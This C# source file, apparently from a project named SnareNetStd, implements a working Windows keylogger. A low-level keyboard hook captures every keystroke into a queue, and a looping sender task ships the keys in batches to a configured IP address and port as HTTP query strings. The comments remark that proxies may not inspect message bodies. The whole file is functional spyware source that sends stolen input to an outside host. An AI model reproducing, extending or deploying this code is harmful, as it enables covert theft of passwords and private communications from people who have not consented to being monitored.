using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;
using System.Collections.Concurrent;
using System.Net;

/// <summary>
/// Originally inspired from:
/// https://null-byte.wonderhowto.com/how-to/create-simple-hidden-console-keylogger-c-sharp-0132757/
/// </summary>
namespace SnareNetStd
{
    class KeylogTask
    {
        // This bool is largely pointless, as the Application.Run means that this thread never... stops. Should sort that out at some point.
        private volatile bool _KeepGoing;
        // A bunch of low level stuff that I should probably try to understand. I'm guessing this represents certain keyboard events.
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        // Setting up the callback for key events.
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        //Store for when shift was pressed last.
        private static bool shiftLastPressed = false;

        // This is means to allow killing the thread, but is currently just wishful thinking.
        public bool KeepGoing
        {
            get { return _KeepGoing; }
            set { _KeepGoing = value; }
        }

        // Kick off the keylogger. Note Application.Run(). I need to find another way of getting the keylogger running.
        // Because once this starts it don't stop.
        public void KeyLogger()
        {
            Console.WriteLine("Logging Keys");
            while (_KeepGoing)
            {
                
                _hookID = SetHook(_proc);
                Application.Run();
                UnhookWindowsHookEx(_hookID);
            }
        }

        // More low level stuff, I'm guessing lower level hooks for events (WH_KEYBOARD_LL)?
        // How I don't know how code in my own app works is beyond me. That's the job of copy pasta!
        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        // A bunch of low level guff...

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        // This is the callback that runs when the hook above fires. 
        // The only thing I've added is chucking the key event on a queue.
        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                Console.WriteLine((Keys)vkCode);
                Keys key = (Keys)vkCode;
                string keyStroke = String.Empty;
                switch (key.ToString())
                {
                    case "D1":
                        keyStroke = "1";
                        break;
                    case "D2":
                        keyStroke = "2";
                        break;
                    case "D3":
                        keyStroke = "3";
                        break;
                    case "D4":
                        keyStroke = "4";
                        break;
                    case "D5":
                        keyStroke = "5";
                        break;
                    case "D6":
                        keyStroke = "6";
                        break;
                    case "D7":
                        keyStroke = "7";
                        break;
                    case "D8":
                        keyStroke = "8";
                        break;
                    case "D9":
                        keyStroke = "9";
                        break;
                    case "D0":
                        keyStroke = "0";
                        break;
                    case "Return":
                        keyStroke = "\n";
                        break;
                    case "LShiftKey":
                        shiftLastPressed = true;
                        break;
                    case "RShiftKey":
                        shiftLastPressed = true;
                        break;
                    default:
                        keyStroke = key.ToString();
                        break;
                }
                
                KeyLogQueue.keyLogQueue.putKeyOnQueue(keyStroke);
                
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        // Some low level dll imports.
        // Some nasty stuff here... probably.
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
        LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        // Low level guff over.
    }

    // This task pulls key events off the key queue and sends them to a server.
    public class SendKeyLogTask
    {
        public void sendKeyLogTask()
        {
            Console.WriteLine("sendkeys");
            // Run for eternity.
            // Can probably implement a thread kill on this as well, however while I can't kill the main keylog thread
            // I'll leave it running so that the queue of key events doesn't get too big.
            while (true)
            {
                // When there's more that 10 key events on the queue take 10 off and send them to the reciever.
                if (KeyLogQueue.keyLogQueue.getQueueLength() > 10)
                {
                    Console.WriteLine(KeyLogQueue.keyLogQueue.getQueueLength());
                    string keys = String.Empty;
                    int i = 0;
                    while (i < 10)
                    {
                        keys += KeyLogQueue.keyLogQueue.getKeyFromQueue();
                        i++;
                    }
                    Console.WriteLine(keys);

                    // Send the key events to the server in the simplest way possible.
                    // Note that any reverse proxies would instantly figure out that something is up.
                    // However proxies tend to not always inspec message bodies... for privacy reasons.
                    using (var client = new WebClient())
                    {
                        string ip = Config.Instance.KeyLogger.IPAddress;
                        int port = Config.Instance.KeyLogger.PortNumber;
                        try
                        {
                            var response = client.DownloadString($"http://{ip}:{port}/?keylog=" + keys);
                        }
                        catch (Exception e)
                        {
                            continue;
                        }
                        
                    }
                }
            }   
        }
    }

    /// <summary>
    /// This is the queue object that gets key events from the keylogger so they can be retrieved by the sender component.
    /// </summary>
    public sealed class KeyLogQueue
    {
        //Copying the approach from the Config class.
        private static Lazy<KeyLogQueue> lazy = new Lazy<KeyLogQueue>(() => new KeyLogQueue());

        public static KeyLogQueue keyLogQueue {  get { return lazy.Value; } }

        private ConcurrentQueue<string> keyQueue = new ConcurrentQueue<string>();

        // pretty self explanatory.
        public void putKeyOnQueue(string key)
        {
            keyQueue.Enqueue(key);
        }
        
        // Same here.
        public string getKeyFromQueue()
        {
            keyQueue.TryDequeue(out string key);
            return key;
        }

        // And here.
        public int getQueueLength()
        {
            return keyQueue.Count();
        }

        // And a constructor that is... not very useful.
        private KeyLogQueue()
        {
        }


    }
}
